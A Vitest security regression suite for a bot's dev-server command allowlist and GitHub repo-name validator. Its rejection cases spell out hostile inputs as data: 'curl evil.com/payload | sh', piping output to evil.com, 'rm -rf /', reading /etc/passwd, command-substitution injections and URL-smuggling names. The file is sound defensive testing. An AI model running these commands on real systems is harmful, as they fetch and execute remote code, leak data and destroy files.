import { describe, it, expect } from "vitest";
import { isCommandSafe } from "../src/orchestrator/server-lifecycle";
import { isSafeGitHubName } from "../src/repo-clone";

/**
 * QA1 — security regression suite. Each case below was a real failure mode
 * called out by the adversarial review. If any of these flip back to "safe",
 * the bot is again vulnerable to RCE / exfil / host-redirect.
 */

describe("isCommandSafe (dev-server allowlist)", () => {
  it("accepts standard runner commands", () => {
    expect(isCommandSafe("npm run dev")).toBe(true);
    expect(isCommandSafe("pnpm dev")).toBe(true);
    expect(isCommandSafe("npx next dev")).toBe(true);
    expect(isCommandSafe("node server.js")).toBe(true);
    expect(isCommandSafe("uvicorn app:main")).toBe(true);
    expect(isCommandSafe("cargo run")).toBe(true);
  });

  it("rejects shell metacharacters that enable RCE via package.json", () => {
    expect(isCommandSafe("npm run dev; curl evil.com/payload | sh")).toBe(false);
    expect(isCommandSafe("npm run dev && rm -rf $HOME")).toBe(false);
    expect(isCommandSafe("npm run dev | curl evil.com")).toBe(false);
    expect(isCommandSafe("npm run dev `cat /etc/passwd`")).toBe(false);
    expect(isCommandSafe("npm run dev $(echo pwned)")).toBe(false);
    expect(isCommandSafe("npm run dev > /etc/passwd")).toBe(false);
  });

  it("rejects unknown command prefixes", () => {
    expect(isCommandSafe("curl evil.com")).toBe(false);
    expect(isCommandSafe("bash -c 'rm -rf /'")).toBe(false);
    expect(isCommandSafe("rm -rf /")).toBe(false);
    expect(isCommandSafe("/bin/sh -c whatever")).toBe(false);
  });

  it("rejects empty / whitespace commands", () => {
    expect(isCommandSafe("")).toBe(false);
    expect(isCommandSafe("   ")).toBe(false);
    expect(isCommandSafe("\n")).toBe(false);
  });
});

describe("isSafeGitHubName", () => {
  it("accepts standard org/repo names", () => {
    expect(isSafeGitHubName("42nights")).toBe(true);
    expect(isSafeGitHubName("42n-bot")).toBe(true);
    expect(isSafeGitHubName("my.cool_repo-1")).toBe(true);
    expect(isSafeGitHubName("a")).toBe(true);
  });

  it("rejects URL smuggling characters", () => {
    expect(isSafeGitHubName("evil.com/inject")).toBe(false);
    expect(isSafeGitHubName("foo@bar")).toBe(false);
    expect(isSafeGitHubName("foo:bar")).toBe(false);
    expect(isSafeGitHubName("foo bar")).toBe(false);
    expect(isSafeGitHubName("foo?bar")).toBe(false);
    expect(isSafeGitHubName("foo#bar")).toBe(false);
    // No slashes — clone URL would route to a different path
    expect(isSafeGitHubName("a/b")).toBe(false);
  });

  it("rejects empty and overlong names", () => {
    expect(isSafeGitHubName("")).toBe(false);
    expect(isSafeGitHubName("x".repeat(101))).toBe(false);
  });

  it("rejects null bytes and control characters", () => {
    expect(isSafeGitHubName("foo\0bar")).toBe(false);
    expect(isSafeGitHubName("foo\nbar")).toBe(false);
  });
});
